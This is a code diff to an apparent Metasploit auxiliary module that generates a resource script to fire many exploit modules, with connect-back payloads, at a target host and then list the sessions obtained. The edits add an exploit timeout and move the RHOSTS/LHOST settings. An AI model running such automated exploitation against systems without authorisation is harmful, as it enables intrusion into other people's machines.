@@ -32,11 +32,12 @@ class MetasploitModule < Msf::Auxiliary
         OptInt.new('TIMEOUT', [true, "The socket connect timeout in milliseconds", 1000]),
         OptInt.new('CONCURRENCY', [true, "The number of concurrent ports to check per host", 10]),
         OptInt.new('DELAY', [true, "The delay between connections, per thread, in milliseconds", 0]),
-        OptInt.new('JITTER', [true, "The delay jitter factor (maximum value by which to +/- DELAY) in milliseconds.", 0]),
+        OptInt.new('JITTER', [true, "The delay jitter factor (maximum value by which to +/- DELAY) in milliseconds", 0]),
         OptString.new('RHOSTS', [true, "The Target's ip"]),
         OptString.new('LHOST', [true, "Local machine to connect back to"]),
         OptString.new('LPATH', [true, "Local path to grep metasploit exploit modules (ends in modules/exploits !)", "./modules/exploits"]),
-        OptString.new('ARCH', [true, "Processor architecture of the target.", "x64"])
+        OptString.new('ARCH', [true, "Processor architecture of the target", "x64"]),
+        OptString.new('EXPLOIT_TIMEOUT', [true, "How long to wait before killing runaway exploits, in seconds", 60])
       ])
   $handler = 2000
 
@@ -50,8 +51,6 @@ class MetasploitModule < Msf::Auxiliary
         end
         open('msfexec.rc', 'a') { |f|
           f.puts("back")
-          f.puts("set RHOSTS #{datastore['RHOSTS']}")
-          f.puts("set LHOST #{datastore['LHOST']}")
           f.puts("set ExitOnSession false")
         }
 
@@ -156,8 +155,10 @@ class MetasploitModule < Msf::Auxiliary
                 end
                 m.puts("set payload #{payl}")
                 # sleep fixes some parallelism bugs
-                m.puts("sleep 0.08")
-                m.puts("exploit -j -z")
+   #             m.puts("sleep 0.08")
+                m.puts("set RHOSTS #{datastore['RHOSTS']}")
+                m.puts("set LHOST #{datastore['LHOST']}")
+                 m.puts("exploit -j -z")
                 m.puts("back")
               }
               # increment the handler so that its on a different LPORT
@@ -169,6 +170,7 @@ class MetasploitModule < Msf::Auxiliary
     end
     # kill jobs and then list sessions
     open('msfexec.rc', 'a') { |f|
+      f.puts("sleep #{datastore['EXPLOIT_TIMEOUT']}")
       f.puts("jobs -K")
       f.puts("sessions")
     }
